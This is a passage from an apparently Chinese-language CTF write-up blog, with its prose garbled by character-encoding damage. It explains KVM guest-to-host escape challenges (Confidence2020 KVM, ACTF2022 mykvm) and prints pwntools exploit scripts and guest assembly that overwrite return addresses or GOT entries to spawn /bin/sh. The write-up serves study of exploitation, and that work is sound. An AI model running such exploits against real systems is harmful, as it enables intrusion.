class="number">11</span>, <span class="comment">/* Code: execute, read, accessed */</span></span><br><span class="line">    .dpl = <span class="number">0</span>,</span><br><span class="line">    .db = <span class="number">0</span>,</span><br><span class="line">    .s = <span class="number">1</span>, <span class="comment">/* Code/data */</span></span><br><span class="line">    .l = <span class="number">1</span>,</span><br><span class="line">    .g = <span class="number">1</span>, <span class="comment">/* 4KB granularity */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>ç„¶åç¨‹åºå°±è¿›å…¥è™šæ‹Ÿæœºå¼€å§‹æ‰§è¡ŒæŒ‡ä»¤äº†ï¼Œæ—¢ç„¶çœ‹æ‡‚äº†è¿™æ®µä»£ç ç»ˆäºå¯ä»¥æ­£å‘åšé¢˜äº†ã€‚</p>
<h2 id="kvmé¢˜ç›®å¤ç°"><a href="#kvmé¢˜ç›®å¤ç°" class="headerlink" title="kvmé¢˜ç›®å¤ç°"></a>kvmé¢˜ç›®å¤ç°</h2><h3 id="Confidence2020-CTF-KVM"><a href="#Confidence2020-CTF-KVM" class="headerlink" title="Confidence2020 CTF KVM"></a>Confidence2020 CTF KVM</h3><p>ä¸»è¦çš„æ¼æ´ç‚¹åœ¨è™šæ‹Ÿvmçš„å†…å­˜æ—¶å€™å‘ç”Ÿäº†é—®é¢˜ï¼Œä»–æŠŠhostç¨‹åºçš„è¿”å›åœ°å€ä¹Ÿæ˜ å°„åˆ°guestå†…å­˜ä¸­ï¼Œå¯¼è‡´å¯ä»¥åœ¨guestä¸­ä¿®æ”¹</p>
<p>hostè¿›ç¨‹çš„è¿”å›åœ°å€ï¼Œç„¶ååˆ©ç”¨<code>hlt</code>æŒ‡ä»¤é€€å‡ºguestè¿”å›hostè¿›ç¨‹ï¼Œç„¶åé€€å‡ºmainå‡½æ•°æ—¶getshell.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x8000</span>uLL);</span><br><span class="line">v14 = &amp;s[<span class="number">4096LL</span> - (((<span class="keyword">unsigned</span> __int16)&amp;savedregs + <span class="number">32752</span>) &amp; <span class="number">0xFFF</span>)];</span><br><span class="line"></span><br><span class="line">  v25[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  v25[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  v26 = <span class="number">0LL</span>;</span><br><span class="line">  v27 = <span class="number">0x8000</span>LL;</span><br><span class="line">  v28 = v14;</span><br></pre></td></tr></table></figure>

<p>æ¼æ´åˆ©ç”¨ä¸€å…±åˆ†ä¸‰æ­¥ï¼Œç¬¬ä¸€æ­¥ä¼ªé€ æ–°çš„é¡µè¡¨é¡¹ï¼Œå› ä¸ºåŸæ¥é¡µè¡¨é¡¹åªèƒ½è®¿é—®åˆ°[0<del>0x4000],è€Œè¿”å›åœ°å€åœ¨[0x7000</del>0x8000],æ‰€ä»¥å¾—ä¼ªé€ æ–°çš„é¡µè¡¨ï¼Œç„¶åä¿®æ”¹cr3å¯„å­˜å™¨ï¼Œè®©æŒ‡ä»¤å¯ä»¥è®¿é—®åˆ°è¿”å›åœ°å€æ‰€åœ¨çš„åŒºåŸŸ.æˆ‘ä»¬é€‰æ‹©è®©cr3=0x1000</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov qword ptr [0x1000],0x2003</span><br><span class="line">mov qword ptr [0x2000],0x3003</span><br><span class="line">mov qword ptr [0x3000], 0x3</span><br><span class="line">mov qword ptr [0x0], 0x7003</span><br><span class="line">mov rax, 0x1000</span><br><span class="line">mov cr3, rax</span><br></pre></td></tr></table></figure>

<p>ç°åœ¨å½“æˆ‘ä»¬è®¿é—®0x0åœ°å€çš„æ—¶å€™ï¼Œå°±ä¼šè®¿é—®åˆ°0x7000çš„åœ°æ–¹ï¼Œç„¶åå¼€å§‹çº¿æ€§æŸ¥æ‰¾ï¼Œæ‰¾åˆ°è¿”å›åœ°å€</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov rax, 0x1050</span><br><span class="line">look_for_return:</span><br><span class="line">	add rax, 0x8</span><br><span class="line">	cmp qword ptr [rax], 0</span><br><span class="line">	je look_for_return</span><br><span class="line">add rax, 0x18</span><br></pre></td></tr></table></figure>

<p>æ­¤æ—¶raxå°±æŒ‡å‘äº†retrunçš„è¿”å›åœ°å€äº†ï¼Œç„¶åé€šè¿‡åŠ å‡é¢„ç®—æŠŠä»–æ”¹ä¸ºogg</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov rcx, qword ptr [rax]</span><br><span class="line">add rcx, 0x249e6</span><br><span class="line">mov qword ptr [rax], rcx</span><br><span class="line">hlt</span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> code <span class="keyword">import</span> interact</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sh=process(<span class="string">&quot;./kvm&quot;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x45226 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf03a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf1247 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov qword ptr [0x1000],0x2003</span></span><br><span class="line"><span class="string">mov qword ptr [0x2000],0x3003</span></span><br><span class="line"><span class="string">mov qword ptr [0x3000], 0x3</span></span><br><span class="line"><span class="string">mov qword ptr [0x0], 0x3</span></span><br><span class="line"><span class="string">mov qword ptr [0x8], 0x7003</span></span><br><span class="line"><span class="string">mov rax, 0x1000</span></span><br><span class="line"><span class="string">mov cr3, rax</span></span><br><span class="line"><span class="string">mov rax, 0x1050</span></span><br><span class="line"><span class="string">look_for_return:</span></span><br><span class="line"><span class="string">	add rax, 0x8</span></span><br><span class="line"><span class="string">	cmp qword ptr [rax], 0</span></span><br><span class="line"><span class="string">	je look_for_return</span></span><br><span class="line"><span class="string">add rax, 0x18</span></span><br><span class="line"><span class="string">mov rcx, qword ptr [rax]</span></span><br><span class="line"><span class="string">add rcx, 0x249e6</span></span><br><span class="line"><span class="string">mov qword ptr [rax], rcx</span></span><br><span class="line"><span class="string">hlt</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">gdb.attach(sh,<span class="string">&#x27;b *(0x555555554000 +&#123;0&#125;)&#x27;</span>.<span class="built_in">format</span>(<span class="number">0xFD3</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    shellcode_len=<span class="built_in">len</span>(asm(shellcode))</span><br><span class="line"></span><br><span class="line">    sh.send(p32(shellcode_len))</span><br><span class="line">    sh.sendline(asm(shellcode))</span><br><span class="line">    sh.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<p>æœ‰ä¸€ä¸ªé—®é¢˜æˆ‘ç›®å‰ä¸èƒ½ç†è§£ï¼Œå°±æ˜¯ç»™ç¬¬å››çº§é¡µè¡¨ç¬¬0é¡¹è®¾ç½®é0çš„ç‰©ç†å†…å­˜ï¼Œç„¶åç¿»è¯‘çš„æ—¶å€™guestå°±ä¼šé€€å‡ºï¼Œç„¶åkvmçˆ†<code>KVM_EXIT_SHUTDOWN</code>çš„é€€å‡ºåŸå› ï¼Œç¬¬å››çº§é¡µè¡¨ç¬¬0é¡¹å¯¹åº”çš„è™šæ‹Ÿåœ°å€å°±æ˜¯0x0~0xfff,å¯èƒ½è¿™ä¸ªåœ°å€æœ‰å•¥ç‰¹æ®Šçš„å§,ä¸èƒ½éšä¾¿è®¾ç½®ã€‚</p>
<p>å¤ç°å®Œä¹‹åå‘ç°ä¹Ÿä¸æ˜¯å¾ˆéš¾ï¼Œä½†æ˜¯è‡ªå·±ä»å¼€å§‹å­¦ä¹ åˆ°å¤ç°ç”¨äº†å¿«ä¸€å‘¨çš„æ—¶é—´ï¼Œæˆ‘æ˜¯çŒªé¼»ï¼Œé™¤äº†ä¸Šè¿°åšæ³•ä¼ªé€ é¡µè¡¨ä¹‹å¤–ï¼Œæˆ‘è§‰å¾—ç†è®ºä¸Šè¿˜å­˜åœ¨ä¸€ç§åšæ³•ï¼Œå³ä»ä¿æŠ¤æ¨¡å¼ä¸­è¿”å›åˆ°å®æ¨¡å¼ï¼Œå°±å¯ä»¥ä¸ç”¨ä¼ªé€ é¡µè¡¨ç›´æ¥è¿›è¡Œä»»æ„<code>ç‰©ç†</code>åœ°å€è®¿é—®äº†ï¼Œä½†çœ‹äº†ä¸€äº›èµ„æ–™çœ‹ä¸æ‡‚æï¼Œåé¢æœ‰æ—¶é—´å†æ£é¼“æ£é¼“ã€‚</p>
<h3 id="ACTF2022-mykvm"><a href="#ACTF2022-mykvm" class="headerlink" title="ACTF2022  mykvm"></a>ACTF2022  mykvm</h3><p>å’Œä¸Šä¸€é¢˜ç±»ä¼¼ï¼Œéƒ½æ˜¯è®¾ç½®vmçš„å†…å­˜æ—¶å¤§å°è®¾ç½®ä¸åˆç†ï¼Œå¯¼è‡´å¯ä»¥åœ¨guestå¯ä»¥è¶Šç•Œè®¿å­˜hostè¿›ç¨‹çš„ä¿¡æ¯ï¼Œæ¯”å¦‚åœ¨è¿™é“é¢˜ä¸­guestå¯ä»¥è®¿é—®åˆ°deståœ°å€ï¼Œç„¶åè¿˜å¯¹åˆ†é…ç»™guestçš„å†…å­˜ä¸æ¸…0ï¼Œå¯¼è‡´å¯ä»¥leakå‡ºæ ˆåœ°å€å’Œlibcåœ°å€ã€‚è¿™é“é¢˜ä¸€å…±æœ‰ä¸¤ç§è§£æ³•</p>
<h4 id="è§£æ³•ä¸€"><a href="#è§£æ³•ä¸€" class="headerlink" title="è§£æ³•ä¸€"></a>è§£æ³•ä¸€</h4><p>kvmè¿›å…¥guestçš„æ—¶å€™é»˜è®¤æ˜¯16ä½å®æ¨¡å¼çš„ï¼Œè§£æ³•ä¸€å°±æ˜¯åœ¨ç›´æ¥å®æ¨¡å¼ä¸­é€šè¿‡<code>out</code>æŒ‡ä»¤leakå‡ºlibcåœ°å€ï¼Œç„¶åä¿®æ”¹destæŒ‡é’ˆï¼Œä½¿å…¶æŒ‡å‘<code>puts_got</code>é™„è¿‘,åœ¨é€€å‡ºè™šæ‹Ÿæœºåæ‰§è¡Œ<code>memcpy(dest, *(const void **)&amp;nbytes[1], 0x20uLL);</code>æ—¶æŠŠgotè¡¨é¡¹æ”¹æˆogg,ç„¶åæ‰§è¡Œ<code>puts(&quot;Bye!&quot;);</code>æ¥getshell.ä¸è¿‡ç¨‹åºä½¿ç”¨readline()å‡½æ•°æ¥æ”¶æ•°æ®ï¼Œæ‰€ä»¥å­—ç¬¦å¿…é¡»æ˜¯å¯è§å­—ç¬¦ï¼Œè¿™å°±å¯¹oggåœ°å€çš„è¾“å…¥é€ æˆäº†å›°éš¾ï¼Œè§£å†³åŠæ³•æ˜¯åªå†™gotçš„åä¸‰ä¸ªå­—èŠ‚ï¼Œä½†æ˜¯è¿™ä¸‰ä¸ªå­—èŠ‚ä¹Ÿæœ‰å¯èƒ½ä¸æ˜¯å¯è§å­—ç¬¦ï¼Œæ‰€ä»¥å…·æœ‰ä¸€å®šæ¦‚ç‡æ€§ï¼Œæˆ‘çš„è„šæœ¬ä¹‹æ‰€ä»¥æ²¡æœ‰çˆ†ç ´åŸå› æ˜¯æˆ‘åœ¨æœ¬åœ°å¤ç°çš„ï¼Œè€Œä¸”æŠŠaslrå…³äº†ï¼Œæˆ‘ç›´æ¥é€‰äº†åä¸‰ä¸ªå­—ç¬¦æ˜¯å¯è§å­—ç¬¦çš„oggæ¥æ‰“çš„</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sh=process(<span class="string">&quot;./mykvm&quot;</span>)</span><br><span class="line">kvm=ELF(<span class="string">&quot;./mykvm&quot;</span>)</span><br><span class="line">puts_got=kvm.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x45226 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf03a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf1247 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">.code16</span></span><br><span class="line"><span class="string">mov bx, 0x3f8</span></span><br><span class="line"><span class="string">get_libc:</span></span><br><span class="line"><span class="string">    mov al, byte ptr [bx]</span></span><br><span class="line"><span class="string">    out 1,al</span></span><br><span class="line"><span class="string">    add bx, 1</span></span><br><span class="line"><span class="string">    cmp bx,0x400</span></span><br><span class="line"><span class="string">    jne get_libc</span></span><br><span class="line"><span class="string">mov bx,0x7100</span></span><br><span class="line"><span class="string">mov byte ptr [bx], 0x0b</span></span><br><span class="line"><span class="string">mov byte ptr [bx+1], 0x20</span></span><br><span class="line"><span class="string">mov byte ptr [bx+2], 0x60</span></span><br><span class="line"><span class="string">hlt</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(sh,<span class="string">&#x27;b *(0x400000 +&#123;0&#125;)&#x27;</span>.<span class="built_in">format</span>(<span class="number">0x1127</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;your code size: &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="number">0x1000</span>))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;your code: &quot;</span>)</span><br><span class="line">    sh.send(shellcode)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;guest name: &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;jingyinghua&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;guest passwd: &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;123123&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;123123\n&quot;</span>)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    libc_base=u64(sh.recv(<span class="number">8</span>))-<span class="number">0x8149d8</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;host name: &quot;</span>)</span><br><span class="line">    ogg_addr=libc_base+<span class="number">0xf1247</span></span><br><span class="line">    sh.sendline(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x1d</span>+p32(ogg_addr&amp;<span class="number">0xffffff</span>))</span><br><span class="line">    sh.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<p>åœ¨å®æ¨¡å¼ä¸­å¯ä»¥é€šè¿‡æ®µå¯„å­˜å™¨:[é€šç”¨å¯„å­˜å™¨]æ¥è¾¾åˆ°2^20çš„å¯»å€ï¼Œä¹Ÿå¯ä»¥ç›´æ¥é€šè¿‡é€šç”¨å¯„å­˜å™¨æ¥å¯»å€æ¯”å¦‚<code>mov byte ptr [bx], 0x0b</code>,ä½†æ³¨æ„åœ°å€ä¸èƒ½è¶…è¿‡0x10000</p>
<h4 id="è§£æ³•äºŒ"><a href="#è§£æ³•äºŒ" class="headerlink" title="è§£æ³•äºŒ"></a>è§£æ³•äºŒ</h4><p>ç›¸è¾ƒäºè§£æ³•å°±éº»çƒ¦å¾ˆå¤šï¼Œè€Œä¸”ä¹Ÿæ˜¯çˆ†ç ´ï¼Œå’Œè§£æ³•ä¸€ç›¸æ¯”ç¨³å®šæ€§å·®ä¸å¤šå§ï¼Œè¿™ç§è§£æ³•å°±æ˜¯è®¾ç½®gdtç«¯æè¿°è¡¨ï¼Œç„¶åä¿®æ”¹cr0å¯„å­˜è¿›å…¥ä¿æŠ¤æ¨¡å¼ï¼Œè¿›å…¥ä¿æŠ¤æ¨¡å¼é»˜è®¤å°±è¿›å…¥äº†32ä½ï¼Œè¿™æ ·å¯»å€èŒƒå›´å°±é«˜è¾¾4Gï¼Œå°±å¯ä»¥ç›´æ¥åˆ©ç”¨<code>0x60a100</code>é‡Œçš„å †åœ°å€,ç„¶åç„¶ååˆ©ç”¨è¿™ä¸ªæŒ‡é’ˆæ³„éœ²libcåœ°å€ï¼Œç„¶åä¿®æ”¹0x40çš„fastbinä¸Šçš„ç¬¬ä¸€ä¸ªå †å—çš„fdä¸º<code>0x602032</code>,è¿™æ®µç©ºé—´åœ¨<code>memcpy_got</code>é™„è¿‘ï¼Œç„¶åä¿®æ”¹destæŒ‡é’ˆæŒ‡å‘çš„å †å—ä¿å­˜â€™/bin/shâ€™å­—ç¬¦ä¸²ï¼Œåœ¨é€€å‡ºè™šæ‹Ÿæœºåå°±å¯ä»¥åˆ©ç”¨readlineå‡½æ•°ç”³è¯·åˆ°è¿™æ®µç©ºé—´ï¼Œç„¶åä¿®æ”¹<code>memcpy_got</code>åä¸¤ä¸ªå­—èŠ‚ä¸º<code>do_system</code>åœ°å€ã€‚æœ€åå°±æ˜¯æ‰§è¡Œ<code>memcpy(des)</code>ç›¸å½“äºæ‰§è¡Œäº†<code>system(&#39;/bin/sh&#39;)</code>,ä½†æ˜¯ç”±äºreadlineå‡½æ•°ä¼šå¯¹å­—ç¬¦æœ€åæ¸…é›¶<code>\x00</code>,æ‰€ä»¥å¾—çˆ†ç ´è®©<code>do_system</code>åœ°å€çš„å€’æ•°ç¬¬ä¸‰ä¸ªå­—èŠ‚ä¸º0æ‰è¡Œï¼Œè¿™ä¸ªå¾—çˆ†ä¸€ä¼šã€‚</p>
<p>äº¤äº’è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> re <span class="keyword">import</span> S</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">kvm=ELF(<span class="string">&quot;./mykvm&quot;</span>)</span><br><span class="line">puts_got=kvm.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line"><span class="comment"># shellcode=asm(&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># hlt</span></span><br><span class="line"><span class="comment"># &#x27;&#x27;&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    sh=process(<span class="string">&quot;./mykvm&quot;</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(sh,&#x27;b *(0x400000 +&#123;0&#125;)&#x27;.format(0x10EE))</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;your code size: &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="number">0x1000</span>))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;your code: &quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./exp.bin&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        code = f.read()</span><br><span class="line">    sh.send(code)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;guest name: &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;a&quot;</span>*<span class="number">0x28</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;guest passwd: &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;a&quot;</span>*<span class="number">0x50</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    libc_base = u64(sh.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x3c5540</span></span><br><span class="line">    system_addr=libc_base+<span class="number">0x44e30</span></span><br><span class="line">    <span class="keyword">if</span> ((system_addr&gt;&gt;<span class="number">0x10</span>)&amp;<span class="number">0xff</span>)==<span class="number">0</span>:</span><br><span class="line">        sleep(<span class="number">1</span>)</span><br><span class="line">        sh.recvuntil(<span class="string">&quot;host name: &quot;</span>)</span><br><span class="line">        sh.sendline(<span class="string">&quot;b&quot;</span>*<span class="number">0x2e</span>+p16(system_addr&amp;<span class="number">0xffff</span>))</span><br><span class="line">        sh.interactive()</span><br><span class="line">    sh.close()</span><br></pre></td></tr></table></figure>

<p>æ±‡ç¼–ä»£ç </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">cli</span><br><span class="line">lgdt [gdt_descriptor]</span><br><span class="line">mov eax,cr0</span><br><span class="line">or eax,0x1</span><br><span class="line">mov cr0, eax</span><br><span class="line">code:</span><br><span class="line">    mov ax, 0x10        ; å°†æ•°æ®æ®µå¯„å­˜å™¨dså’Œé™„åŠ æ®µå¯„å­˜å™¨esç½®ä¸º0x10</span><br><span class="line">    mov ds, ax         </span><br><span class="line">    mov es, ax</span><br><span class="line">    mov fs, ax          ; fså’Œgså¯„å­˜å™¨ç”±æ“ä½œç³»ç»Ÿä½¿ç”¨ï¼Œè¿™é‡Œç»Ÿä¸€è®¾æˆ0x10</span><br><span class="line">    mov gs, ax</span><br><span class="line">    mov ax, 0x18        ; å°†æ ˆæ®µå¯„å­˜å™¨ssç½®ä¸º0x18</span><br><span class="line">    mov ss, ax</span><br><span class="line">    mov ebp, 0x7c00     ; ç°åœ¨æ ˆé¡¶æŒ‡å‘ 0x7c00</span><br><span class="line">    mov esp, ebp</span><br><span class="line"></span><br><span class="line">    mov eax, [0x7100]</span><br><span class="line">    add eax, 0x1bc8</span><br><span class="line">    sub eax, 0x603000</span><br><span class="line">    mov ecx, [eax]</span><br><span class="line">    mov edx, [eax+4]</span><br><span class="line">    mov eax, ecx</span><br><span class="line">get_libc1:</span><br><span class="line">    out 1,al</span><br><span class="line">    shr eax, 8</span><br><span class="line">    cmp eax, 0</span><br><span 